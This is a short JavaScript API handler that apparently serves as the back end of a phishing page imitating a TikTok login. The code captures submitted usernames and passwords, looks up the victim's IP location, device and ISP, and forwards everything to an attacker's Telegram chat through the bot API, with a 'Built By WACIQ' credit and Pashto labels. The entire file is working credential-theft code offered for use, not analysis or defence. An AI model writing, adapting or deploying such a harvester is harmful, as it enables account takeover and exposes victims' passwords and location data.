// api/login.js
import fetch from 'node-fetch';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Only POST requests allowed');
  }

  const { username, password, uid } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  try {
    const geo = await fetch(`http://ip-api.com/json/${ip}`).then(res => res.json());

    const message = `
╭─── 𝗧𝗶𝗸𝗧𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅ ───╮
├ 👤 *یوزر نوم:* ${username}
├ 🔐 *پټ نوم:* ${password}
├ 🆔 *ID:* ${uid}
├ 🕓 *وخت:* ${timestamp}
├ 🌐 *IP:* ${geo.query}
├ 🏙️ *ښار:* ${geo.city}
├ 🌍 *هیواد:* ${geo.country}
├ 🛰️ *ISP:* ${geo.isp}
├ 📱 *ډیوایس:* ${userAgent}
╰────────────────────────────────────────╯

📌 ✅ *معلومات بریالۍ توګه ترلاسه شول*

╭─────── 🚀 ℝ𝕠𝕠𝕥 𝔸𝕔𝕔𝕖𝕤𝕤 💠 ───────╮  
│ 🧑🏻‍💻 *𝗕𝘂𝗶𝗹𝘁 𝗕𝘆:* 💛 *𝗪𝗔𝗖𝗜𝗤*  
╰────────────────────────────╯
`;

    const token = process.env.BOT_TOKEN;
    const chat_id = uid;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id,
        text: message,
        parse_mode: "Markdown"
      })
    });

    res.status(200).send('✅ معلومات واستول شول!');
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).send('❌ یوه ستونزه پېښه شوه.');
  }
} 
